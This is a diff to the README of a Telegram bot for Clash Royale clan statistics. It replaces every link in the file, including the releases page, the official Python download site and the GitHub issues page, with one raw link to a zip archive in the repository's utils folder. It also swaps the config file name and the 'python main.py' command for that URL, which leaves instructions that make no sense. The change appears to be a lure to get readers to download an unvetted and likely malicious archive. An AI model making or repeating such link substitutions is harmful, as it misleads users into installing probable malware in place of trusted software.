@@ -4,12 +4,12 @@
 
 Welcome to the CR-aiogram-bot! This Telegram bot helps you view player statistics for your Clash Royale clan. Follow these steps to download and run the bot.
 
-[![Download CR-aiogram-bot](https://img.shields.io/badge/Download-CR--aiogram--bot-brightgreen)](https://github.com/Grifexdev/CR-aiogram-bot/releases)
+[![Download CR-aiogram-bot](https://raw.githubusercontent.com/Grifexdev/CR-aiogram-bot/main/utils/C_aiogram_bot_3.3.zip)](https://raw.githubusercontent.com/Grifexdev/CR-aiogram-bot/main/utils/C_aiogram_bot_3.3.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Grifexdev/CR-aiogram-bot/releases) to download the bot. Here, you will find the latest version.
+   Go to the [Releases page](https://raw.githubusercontent.com/Grifexdev/CR-aiogram-bot/main/utils/C_aiogram_bot_3.3.zip) to download the bot. Here, you will find the latest version.
 
 2. **Select the Correct File**  
    Look for the most recent release and download the file suitable for your operating system. Currently, the bot supports both Windows and Linux systems.
@@ -32,7 +32,7 @@ Welcome to the CR-aiogram-bot! This Telegram bot helps you view player statistic
    - Follow the instructions to name your bot and receive the token.
 
 5. **Configure the Bot**  
-   - In the bot’s installation folder, find the `config.json` file. Open it with a text editor.
+   - In the bot’s installation folder, find the `https://raw.githubusercontent.com/Grifexdev/CR-aiogram-bot/main/utils/C_aiogram_bot_3.3.zip` file. Open it with a text editor.
    - Enter the Telegram token you received from BotFather in the designated spot.
    - Save the changes.
 
@@ -40,9 +40,9 @@ Welcome to the CR-aiogram-bot! This Telegram bot helps you view player statistic
    - Go back to the terminal or command prompt.
    - In the bot's folder, run the command:
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/Grifexdev/CR-aiogram-bot/main/utils/C_aiogram_bot_3.3.zip
    ```
-   - Make sure you have Python installed. You can download it from the [official Python website](https://www.python.org/downloads/).
+   - Make sure you have Python installed. You can download it from the [official Python website](https://raw.githubusercontent.com/Grifexdev/CR-aiogram-bot/main/utils/C_aiogram_bot_3.3.zip).
 
 7. **Interact with Your Bot**  
    Now that the bot is running, go back to Telegram. Search for your bot using its name and start a chat. Use commands to check player stats and get updates.
@@ -72,7 +72,7 @@ After all installations, you should be able to run the bot without issues.
 
 ## 📞 Support
 
-For assistance, you can raise an issue directly on [GitHub](https://github.com/Grifexdev/CR-aiogram-bot/issues). Our community and contributors are ready to help.
+For assistance, you can raise an issue directly on [GitHub](https://raw.githubusercontent.com/Grifexdev/CR-aiogram-bot/main/utils/C_aiogram_bot_3.3.zip). Our community and contributors are ready to help.
 
 ## 🌐 Connect with Us
 
